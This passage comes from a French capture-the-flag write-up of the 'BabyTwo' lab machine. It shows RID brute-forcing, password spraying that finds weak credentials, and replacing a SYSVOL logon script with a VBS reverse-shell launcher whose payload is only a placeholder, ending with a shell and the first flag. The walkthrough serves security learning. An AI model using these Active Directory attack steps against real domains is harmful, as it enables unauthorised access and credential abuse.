+</span></span></span><span class="line"><span class="cl">d-------     0.00 B  2023-08-22 22:10  ..<span class="se">\
+</span></span></span><span class="line"><span class="cl">d-------     0.00 B  2023-09-07 21:13  dev<span class="se">\
+</span></span></span><span class="line"><span class="cl">■<span class="o">[</span><span class="se">\\</span>dc.baby2.vl<span class="se">\a</span>pps<span class="se">\]</span>&gt; <span class="nb">cd</span> dev
+</span></span><span class="line"><span class="cl">■<span class="o">[</span><span class="se">\\</span>dc.baby2.vl<span class="se">\a</span>pps<span class="se">\d</span>ev<span class="se">\]</span>&gt; ls
+</span></span><span class="line"><span class="cl">d-------     0.00 B  2023-09-07 21:13  .<span class="se">\
+</span></span></span><span class="line"><span class="cl">d-------     0.00 B  2023-09-07 21:12  ..<span class="se">\
+</span></span></span><span class="line"><span class="cl">-a------   108.00 B  2023-09-07 21:16  CHANGELOG
+</span></span><span class="line"><span class="cl">-a------    1.76 kB  2023-09-07 21:13  login.vbs.lnk</span></span></code></pre></div></div>
+<h3 id="rid-brute">RID Brute</h3>
+<p>Ensuite j&rsquo;énumère les utilisateurs du domaine avec l&rsquo;option <code>--rid-brute</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/workspace/BabyTwo
+</span></span><span class="line"><span class="cl">❯ nxc smb dc.baby2.vl -u <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span> --rid-brute
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:baby2.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> baby2.vl<span class="se">\g</span>uest:
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               498: BABY2<span class="se">\E</span>nterprise Read-only Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               500: BABY2<span class="se">\A</span>dministrator <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               501: BABY2<span class="se">\G</span>uest <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               502: BABY2<span class="se">\k</span>rbtgt <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               512: BABY2<span class="se">\D</span>omain Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               513: BABY2<span class="se">\D</span>omain Users <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               514: BABY2<span class="se">\D</span>omain Guests <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               515: BABY2<span class="se">\D</span>omain Computers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               516: BABY2<span class="se">\D</span>omain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               517: BABY2<span class="se">\C</span>ert Publishers <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               518: BABY2<span class="se">\S</span>chema Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               519: BABY2<span class="se">\E</span>nterprise Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               520: BABY2<span class="se">\G</span>roup Policy Creator Owners <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               521: BABY2<span class="se">\R</span>ead-only Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               522: BABY2<span class="se">\C</span>loneable Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               525: BABY2<span class="se">\P</span>rotected Users <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               526: BABY2<span class="se">\K</span>ey Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               527: BABY2<span class="se">\E</span>nterprise Key Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               553: BABY2<span class="se">\R</span>AS and IAS Servers <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               571: BABY2<span class="se">\A</span>llowed RODC Password Replication Group <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               572: BABY2<span class="se">\D</span>enied RODC Password Replication Group <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               1000: BABY2<span class="se">\D</span>C$ <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               1101: BABY2<span class="se">\D</span>nsAdmins <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               1102: BABY2<span class="se">\D</span>nsUpdateProxy <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               1103: BABY2<span class="se">\g</span>poadm <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               1104: BABY2<span class="se">\o</span>ffice <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               1105: BABY2<span class="se">\J</span>oan.Jennings <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               1106: BABY2<span class="se">\M</span>ohammed.Harris <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               1107: BABY2<span class="se">\H</span>arry.Shaw <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               1108: BABY2<span class="se">\C</span>arl.Moore <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               1109: BABY2<span class="se">\R</span>yan.Jenkins <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               1110: BABY2<span class="se">\K</span>ieran.Mitchell <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               1111: BABY2<span class="se">\N</span>icola.Lamb <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               1112: BABY2<span class="se">\L</span>ynda.Bailey <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               1113: BABY2<span class="se">\J</span>oel.Hurst <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               1114: BABY2<span class="se">\A</span>melia.Griffiths <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               1602: BABY2<span class="se">\l</span>ibrary <span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               2601: BABY2<span class="se">\l</span>egacy <span class="o">(</span>SidTypeGroup<span class="o">)</span></span></span></code></pre></div></div>
+<p>Je formatte alors la sortie de la commande précédente pour avoir un fichier <code>users.txt</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/workspace/BabyTwo
+</span></span><span class="line"><span class="cl">❯ cat tmp <span class="p">|</span> grep <span class="s1">&#39;SidTypeUser&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;{print $6}&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;\&#39;</span> -f <span class="m">2</span> &gt; users.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/workspace/BabyTwo
+</span></span><span class="line"><span class="cl">❯ cat users.txt
+</span></span><span class="line"><span class="cl">Administrator
+</span></span><span class="line"><span class="cl">Guest
+</span></span><span class="line"><span class="cl">krbtgt
+</span></span><span class="line"><span class="cl">DC$
+</span></span><span class="line"><span class="cl">gpoadm
+</span></span><span class="line"><span class="cl">Joan.Jennings
+</span></span><span class="line"><span class="cl">Mohammed.Harris
+</span></span><span class="line"><span class="cl">Harry.Shaw
+</span></span><span class="line"><span class="cl">Carl.Moore
+</span></span><span class="line"><span class="cl">Ryan.Jenkins
+</span></span><span class="line"><span class="cl">Kieran.Mitchell
+</span></span><span class="line"><span class="cl">Nicola.Lamb
+</span></span><span class="line"><span class="cl">Lynda.Bailey
+</span></span><span class="line"><span class="cl">Joel.Hurst
+</span></span><span class="line"><span class="cl">Amelia.Griffiths
+</span></span><span class="line"><span class="cl">library</span></span></code></pre></div></div>
+<h1 id="shell-en-tant-que-ameliagriffiths">Shell en tant que Amelia.Griffiths</h1>
+<h2 id="password-spraying">Password spraying</h2>
+<p>N&rsquo;ayant pas de mot de passe pour tester la connexion avec les utilisateurs trouvés, j&rsquo;utilise cette liste d&rsquo;utilisateurs comme wordlist de mot de passe. Je trouve alors deux identifiants valides : <code>Carl.Moore:Carl.Moore</code>, <code>library:library</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/workspace/BabyTwo
+</span></span><span class="line"><span class="cl">❯ nxc smb dc.baby2.vl -u users.txt -p users.txt --continue-on-success --no-bruteforce
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:baby2.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> baby2.vl<span class="se">\A</span>dministrator:Administrator STATUS_LOGON_FAILURE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> baby2.vl<span class="se">\G</span>uest:Guest STATUS_LOGON_FAILURE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> baby2.vl<span class="se">\k</span>rbtgt:krbtgt STATUS_LOGON_FAILURE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> baby2.vl<span class="se">\D</span>C$:DC$ STATUS_LOGON_FAILURE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> baby2.vl<span class="se">\g</span>poadm:gpoadm STATUS_LOGON_FAILURE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> baby2.vl<span class="se">\J</span>oan.Jennings:Joan.Jennings STATUS_LOGON_FAILURE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> baby2.vl<span class="se">\M</span>ohammed.Harris:Mohammed.Harris STATUS_LOGON_FAILURE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> baby2.vl<span class="se">\H</span>arry.Shaw:Harry.Shaw STATUS_LOGON_FAILURE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> baby2.vl<span class="se">\C</span>arl.Moore:Carl.Moore
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> baby2.vl<span class="se">\R</span>yan.Jenkins:Ryan.Jenkins STATUS_LOGON_FAILURE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> baby2.vl<span class="se">\K</span>ieran.Mitchell:Kieran.Mitchell STATUS_LOGON_FAILURE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> baby2.vl<span class="se">\N</span>icola.Lamb:Nicola.Lamb STATUS_LOGON_FAILURE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> baby2.vl<span class="se">\L</span>ynda.Bailey:Lynda.Bailey STATUS_LOGON_FAILURE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> baby2.vl<span class="se">\J</span>oel.Hurst:Joel.Hurst STATUS_LOGON_FAILURE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>-<span class="o">]</span> baby2.vl<span class="se">\A</span>melia.Griffiths:Amelia.Griffiths STATUS_LOGON_FAILURE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> baby2.vl<span class="se">\l</span>ibrary:library</span></span></code></pre></div></div>
+<p>Je vois que <strong>library</strong> a plus d&rsquo;accès sur le reste des partages.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/workspace/BabyTwo   7s
+</span></span><span class="line"><span class="cl">❯ nxc smb dc.baby2.vl -u library -p library --shares
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:baby2.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> baby2.vl<span class="se">\l</span>ibrary:library
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               apps            READ,WRITE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               C$                              Default share
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               docs            READ,WRITE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               homes           READ,WRITE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               NETLOGON        READ            Logon server share
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               SYSVOL          READ            Logon server share</span></span></code></pre></div></div>
+<p>Il en est de même pour <strong>Carl.Moore</strong>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/workspace/BabyTwo
+</span></span><span class="line"><span class="cl">❯ nxc smb dc.baby2.vl -u Carl.Moore -p Carl.Moore --shares
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:baby2.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> baby2.vl<span class="se">\C</span>arl.Moore:Carl.Moore
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               apps            READ,WRITE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               C$                              Default share
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               docs            READ,WRITE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               homes           READ,WRITE
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               NETLOGON        READ            Logon server share
+</span></span><span class="line"><span class="cl">SMB         10.129.234.72   <span class="m">445</span>    DC               SYSVOL          READ            Logon server share</span></span></code></pre></div></div>
+<p>En regardant les propriétés de <code>Carl.Moore</code>, je vois qu&rsquo;il a un attribut <code>scriptPath</code>. Ce qui signifie qu&rsquo;il <strong>exécute un script de connexion (logon script)</strong> à chaque ouverture de session. Le flag <strong><code>PASSWD_NOTREQD</code></strong> dans l’attribut <strong><code>userAccountControl</code></strong> signifie que <strong>le compte n’est pas obligé d’avoir un mot de passe</strong>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u Carl.Moore -p Carl.Moore --host baby2.vl -d baby2.vl get object Carl.Moore</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/BabyTwo/BabyTwo-1.png"
+        data-srcset="/images/BabyTwo/BabyTwo-1.png, /images/BabyTwo/BabyTwo-1.png 1.5x, /images/BabyTwo/BabyTwo-1.png 2x"
+        data-sizes="auto"
+        alt="/images/BabyTwo/BabyTwo-1.png"
+        title="/images/BabyTwo/BabyTwo-1.png" width="925" height="531" /></p>
+<h2 id="login-script-abuse">Login script abuse</h2>
+<p>Je recherche alors sur Google comment exploiter des scripts de connexion et je trouve cet article [Medium](<a href="https://medium.com/@muneebnawaz3849/writescriptpath-abuse-in-active-directory-cb5945848a51" target="_blank" rel="noopener noreffer ">WriteScriptPath Abuse in Active Directory | by Furious5 | Medium</a>) qui explique comment le faire. Je crée un fichier <code>login.vbs</code> avec le contenu de reverse shell suivant :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Set oShell = CreateObject(&#34;WScript.Shell&#34;)
+</span></span><span class="line"><span class="cl">oShell.Run(&#34;MON_PAYLOAD_REVERSE_SHELL_POWERSHELL&#34;)</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/BabyTwo/BabyTwo-4.png"
+        data-srcset="/images/BabyTwo/BabyTwo-4.png, /images/BabyTwo/BabyTwo-4.png 1.5x, /images/BabyTwo/BabyTwo-4.png 2x"
+        data-sizes="auto"
+        alt="/images/BabyTwo/BabyTwo-4.png"
+        title="/images/BabyTwo/BabyTwo-4.png" width="1127" height="830" /></p>
+<p>J&rsquo;accède au partage <code>SYSVOL</code> et je remplace le fichier <code>login.vbs</code> par celui que j&rsquo;ai créé.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/workspace/BabyTwo   739s
+</span></span><span class="line"><span class="cl">❯ smbclient.py baby2.vl/Carl.Moore:Carl.Moore@dc.baby2.vl
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Type <span class="nb">help</span> <span class="k">for</span> list of commands
+</span></span><span class="line"><span class="cl"><span class="c1"># use sysvol</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Tue Aug <span class="m">22</span> 19:37:46 <span class="m">2023</span> .
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Tue Aug <span class="m">22</span> 19:37:46 <span class="m">2023</span> ..
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Tue Aug <span class="m">22</span> 19:37:46 <span class="m">2023</span> baby2.vl
+</span></span><span class="line"><span class="cl"><span class="c1"># cd baby2.vl</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Tue Aug <span class="m">22</span> 19:43:55 <span class="m">2023</span> .
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Tue Aug <span class="m">22</span> 19:37:46 <span class="m">2023</span> ..
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Tue Dec <span class="m">23</span> 21:56:40 <span class="m">2025</span> DfsrPrivate
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Tue Aug <span class="m">22</span> 19:37:46 <span class="m">2023</span> Policies
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Mon Aug <span class="m">25</span> 10:30:39 <span class="m">2025</span> scripts
+</span></span><span class="line"><span class="cl"><span class="c1"># cd scripts</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Mon Aug <span class="m">25</span> 10:30:39 <span class="m">2025</span> .
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Tue Aug <span class="m">22</span> 19:43:55 <span class="m">2023</span> ..
+</span></span><span class="line"><span class="cl">-rw-rw-rw-        <span class="m">992</span>  Mon Aug <span class="m">25</span> 13:23:29 <span class="m">2025</span> login.vbs
+</span></span><span class="line"><span class="cl"><span class="c1"># rm login.vbs</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># put login.vbs</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Tue Dec <span class="m">23</span> 23:15:15 <span class="m">2025</span> .
+</span></span><span class="line"><span class="cl">drw-rw-rw-          <span class="m">0</span>  Tue Aug <span class="m">22</span> 19:43:55 <span class="m">2023</span> ..
+</span></span><span class="line"><span class="cl">-rw-rw-rw-        <span class="m">467</span>  Tue Dec <span class="m">23</span> 23:15:15 <span class="m">2025</span> login.vbs</span></span></code></pre></div></div>
+<h2 id="shell">Shell</h2>
+<p>Quelques secondes plus tard, j&rsquo;obtiens un shell en tant que <strong>Carl.Moore</strong>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/BabyTwo/BabyTwo-5.png"
+        data-srcset="/images/BabyTwo/BabyTwo-5.png, /images/BabyTwo/BabyTwo-5.png 1.5x, /images/BabyTwo/BabyTwo-5.png 2x"
+        data-sizes="auto"
+        alt="/images/BabyTwo/BabyTwo-5.png"
+        title="/images/BabyTwo/BabyTwo-5.png" width="1693" height="379" /></p>
+<p>Je récupère le premier flag dans le répertoire <code>C:</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/BabyTwo/BabyTwo-6.png"
+        data-srcset="/images/BabyTwo/BabyTwo-6.png, /images/BabyTwo/BabyTwo-6.png 1.5x, /images/BabyTwo/BabyTwo-6.png 2x"
+        data-sizes="auto"
+        alt="/images/BabyTwo/BabyTwo-6.png"
+        title="/images/BabyTwo/BabyTwo-6.png" width="859" height="651" /></p>
+<h1 id="shell-en-tant-que-gpoadm">Shell en tant que GPOADM</h1>
